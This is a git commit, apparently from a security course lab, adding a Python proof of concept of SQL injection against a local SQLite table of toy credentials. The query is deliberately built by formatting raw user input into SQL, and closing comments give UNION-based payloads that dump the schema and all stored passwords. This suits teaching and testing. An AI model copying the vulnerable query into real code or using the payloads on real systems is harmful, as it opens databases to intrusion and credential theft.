7316673cfd2b3948fb5f3d4c13d018e053332722
allexkap <aekpstn@gmail.com>
2024-04-14 00:47:21 +0300

    add sql injection poc

---
+++ lab6/sqli.py
@@ -0,0 +1,36 @@
+import sqlite3
+import os
+
+
+create_table = '''\
+create table if not exists passwd (
+    login text primary key,
+    password text not null,
+    shell text not null
+);
+'''
+insert_values = '''\
+insert or replace into passwd values
+    ('root', 'toor', '/bin/bash'),
+    ('sunr', '1234', '/usr/bin/bash'),
+    ('tmp', '', '/usr/bin/nologin');
+'''
+cmd = "select shell from passwd where login = '{}' and password = '{}'"
+
+con = sqlite3.connect('db.sqlite3')
+cur = con.cursor()
+cur.execute(create_table)
+cur.execute(insert_values)
+
+
+login, password = input('login: '), input('password: ')
+shell = cur.execute(cmd.format(login, password)).fetchone()
+
+if shell:
+    print('user shell is', shell[0])
+else:
+    print('user not found')
+
+
+# ' and 0=1 union select group_concat(sql) from sqlite_master --
+# ' and 0=1 union select group_concat(login || ', ' || password || ', ' || shell, '; ') from passwd --
